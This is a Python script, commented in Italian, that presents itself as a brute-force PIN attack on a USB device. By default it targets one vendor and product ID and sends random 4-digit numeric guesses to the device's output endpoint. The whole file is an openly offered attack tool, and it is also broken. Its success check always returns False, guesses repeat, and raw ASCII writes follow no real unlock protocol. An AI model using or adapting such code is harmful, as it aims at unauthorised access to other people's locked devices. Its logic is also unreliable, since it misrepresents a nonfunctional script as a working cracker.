import random
import string
import usb.core
import usb.util

# Genera una password casuale di 4 caratteri (solo numeri)
def generate_password():
    password_length = 4
    characters = string.digits
    password = ''.join(random.choice(characters) for _ in range(password_length))
    return password

# Esegue l'attacco di forza bruta generando password di 4 caratteri su un dispositivo USB selezionato
def bruteCracking(device):
    while True:
        password = generate_password()
        print("Tentativo con password:", password)
        if is_correct_password(password):
            print("Password trovata:", password)
            return

        # Invia la richiesta al dispositivo USB
        send_request(device, password)

# Verifica se la password generata è quella corretta (esempio: "1234")
def is_correct_password(password):
    return False

# Invia una richiesta al dispositivo USB
def send_request(device, password):
    if device is None:
        print("Dispositivo USB non valido.")
        return
    # Effettua la comunicazione con il dispositivo USB
    # In base al protocollo e al formato specifici del dispositivo

    # Esempio: Invio la richiesta come una stringa ASCII
    data = password.encode('ascii')
    
    endpoint_out = None
    for endpoint in device[0].interfaces()[0].endpoints():
        if usb.util.endpoint_direction(endpoint.bEndpointAddress) == usb.util.ENDPOINT_OUT:
            endpoint_out = endpoint
            break
    
    if endpoint_out is not None:
        device.write(endpoint_out.bEndpointAddress, data)
    else:
        print("Endpoint di output non trovato.")

# Ottiene la lista dei dispositivi USB collegati al PC
def get_usb_devices(idVendor=None, idProduct=None):
    usb_devices = usb.core.find(find_all=True, idVendor=idVendor, idProduct=idProduct)
    return usb_devices

# Stampa la lista dei dispositivi USB collegati
def print_usb_devices(usb_devices):
    print("Dispositivi USB collegati:")
    for i, device in enumerate(usb_devices):
        print(f"[{i+1}] {device}")

# Chiede all'utente di selezionare un dispositivo USB
def choose_usb_device(usb_devices):
    device_index = int(input("Inserisci il numero del dispositivo USB: ")) - 1
    if device_index < 0 or device_index >= len(usb_devices):
        print("Indice del dispositivo USB non valido.")
        return None
    selected_device = usb_devices[device_index]
    print("Dispositivo USB selezionato:", selected_device)
    return selected_device

# Avvia l'attacco di forza bruta
def start_brute_force(idVendor=None, idProduct=None):
    usb_devices = get_usb_devices(idVendor=idVendor, idProduct=idProduct)
    usb_devices_list = list(usb_devices)
    if usb_devices_list:
        print_usb_devices(usb_devices_list)
        selected_device = choose_usb_device(usb_devices_list)
        bruteCracking(selected_device)
    else:
        print("Nessun dispositivo USB collegato.")

# Avvia il programma principale
def main():
    idVendor = 0x05ac  # ID del fornitore predefinito
    idProduct = 0x12a8  # ID del prodotto predefinito
    start_brute_force(idVendor=idVendor, idProduct=idProduct)

if __name__ == "__main__":
    main()
